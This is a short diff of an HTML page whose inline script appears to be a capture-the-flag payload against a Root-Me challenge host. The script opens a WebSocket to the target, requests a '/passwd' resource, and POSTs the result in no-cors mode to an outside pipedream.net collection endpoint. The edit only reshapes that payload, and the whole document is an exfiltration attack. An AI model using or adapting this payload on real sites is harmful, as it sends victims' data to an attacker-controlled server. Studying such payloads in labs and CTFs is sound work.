@@ -3,15 +3,10 @@
 <body>
   <script>
     websocket = new WebSocket('ws://ctf02.root-me.org/ws');
-    websocket.addEventListener('open', start());
-    });
-    function getdata(){
-      $.ajax({ url: 'http://ctf02.root-me.org/passwd', success: function(data) { return data } });
-    }
-    let data = getdata()
-    function start(data) {
+    websocket.addEventListener('open', (event) => {
+      let data = $.ajax({ url: 'http://ctf02.root-me.org/passwd', success: function(data) { return data } });
       fetch('https://eoin4a7dtj6eyhc.m.pipedream.net', {method:'POST',mode:'no-cors',body:data})
-    }
+    });
   </script>
 </body>
 </html>
